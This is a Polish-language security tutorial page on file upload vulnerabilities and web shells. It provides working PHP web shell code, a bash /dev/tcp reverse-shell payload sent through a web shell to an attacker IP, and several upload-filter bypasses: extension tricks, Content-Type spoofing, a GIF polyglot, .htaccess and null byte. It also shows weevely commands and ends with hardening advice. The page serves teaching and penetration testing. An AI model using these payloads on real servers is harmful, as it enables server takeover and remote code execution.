---
id: "file-upload-web-shells"
title: "File Upload Vulnerabilities i Web Shells"
sidebar_label: "📤 File Upload Vulnerabilities i Web Shells"
sidebar_position: 16
---

# 📤 File Upload Vulnerabilities i Web Shells

Niewłaściwa walidacja przesyłanych plików to jedna z najszybszych dróg do **Remote Code Execution**. Jeśli atakujący umieści na serwerze plik wykonywalny (np. skrypt PHP) i zdoła go uruchomić, uzyskuje **web shell** — interaktywny dostęp do systemu przez przeglądarkę.

---

## 🧠 Łańcuch ataku

By upload prowadził do RCE, muszą zajść trzy warunki:
1. Aplikacja **przyjmuje plik** kontrolowany przez atakującego.
2. Plik trafia do **lokalizacji dostępnej i wykonywalnej** przez serwer WWW.
3. Serwer **interpretuje** plik (np. PHP w katalogu obsługiwanym przez moduł PHP).

---

## 💥 Tworzenie web shella

### **1️⃣ Minimalny web shell PHP**
```php
<?php system($_GET['cmd']); ?>
```
Po wgraniu jako `shell.php` i wywołaniu:
```http
http://example.com/uploads/shell.php?cmd=id
```
Serwer wykona polecenie `id` i zwróci jego wynik.

### **2️⃣ Pełniejszy web shell**
```php
<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
```

### **3️⃣ Web shell → Reverse Shell**
Z poziomu web shella otwórz pełną sesję (powiązanie z modułem Reverse Shell):
```http
http://example.com/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.1.100/4444%200>%261'
```
Na maszynie atakującego nasłuch: `nc -lvnp 4444`.

> Gotowe, dojrzałe web shelle (np. **p0wny-shell**, **WhiteWinterWolf**) bywają wygodniejsze, ale zawsze rozumiej, co uruchamiasz.

---

## 🛡️ Obejście walidacji uploadu

### **1️⃣ Obejście filtra rozszerzeń**
Gdy blokowane jest `.php`, spróbuj alternatywnych rozszerzeń interpretowanych przez serwer:
```
shell.php5   shell.phtml   shell.pht   shell.phar   shell.php.jpg
```
Podwójne rozszerzenie `shell.php.jpg` działa, gdy serwer rozpoznaje plik po pierwszym pasującym wzorcu lub źle skonfigurowano `AddHandler`.

### **2️⃣ Obejście walidacji Content-Type**
Przechwyć żądanie w Burp i podmień nagłówek na zaufany typ, zachowując treść PHP:
```http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

### **3️⃣ Magic bytes / polyglot**
Walidacja po sygnaturze pliku? Dodaj nagłówek prawdziwego obrazu przed kodem:
```
GIF89a;
<?php system($_GET['cmd']); ?>
```
Plik przechodzi jako GIF, a interpreter PHP wykona kod po znaczniku `<?php`.

### **4️⃣ Obejście przez `.htaccess`**
Jeśli możesz wgrać `.htaccess`, zmuś Apache do traktowania nieszkodliwego rozszerzenia jak PHP:
```apache
AddType application/x-httpd-php .jpg
```
Następnie wgraj `shell.jpg` z kodem PHP.

### **5️⃣ Null byte i obcięcie ścieżki (starsze stosy)**
Na przestarzałych wersjach PHP (`< 5.3.4`):
```
shell.php%00.jpg
```

---

## 🔎 Powiązane podatności uploadu

- **Path Traversal w nazwie pliku** – `../../../var/www/html/shell.php` nadpisuje pliki poza katalogiem uploadu.
- **Zip Slip** – złośliwa ścieżka w archiwum rozpakowywanym przez aplikację.
- **SVG/XML XXE** – patrz moduł XXE (upload SVG jako wektor).
- **Image processing RCE** – np. **ImageTragick** (CVE-2016-3714) w ImageMagick.
- **Pixel flood / DoS** – ogromne wymiary obrazu wyczerpujące pamięć.

---

## 🛠️ Narzędzia
- **Burp Suite** – manipulacja żądaniem multipart, fuzzing rozszerzeń (Intruder).
- **weevely** – generowanie i obsługa ukrytych web shelli PHP:
```bash
weevely generate haslo123 shell.php
weevely http://example.com/uploads/shell.php haslo123
```
- **Upload scanner / fuzzlist** – `SecLists/Payloads/File-Upload`.

---

## 🔐 Jak zabezpieczyć aplikację przed atakami na upload?
✅ **Whitelist rozszerzeń i typów MIME** – zezwalaj tylko na konkretne, bezpieczne formaty.
✅ **Generuj losowe nazwy plików** i odrzucaj ścieżki względne.
✅ **Przechowuj uploady poza webrootem** lub w katalogu bez prawa wykonywania (`php_admin_flag engine off`).
✅ **Weryfikuj zawartość, nie tylko rozszerzenie** (re-enkoduj obrazy, sprawdzaj realny typ).
✅ **Serwuj pliki przez kontrolowany endpoint** z `Content-Disposition: attachment`.
✅ **Ogranicz rozmiar i skanuj antywirusem** (np. ClamAV) w pipeline.

---

Upload plików bez kontroli to prosta droga do przejęcia serwera. Kolejnym krokiem będzie analiza podatności **Insecure Deserialization**! 🚀
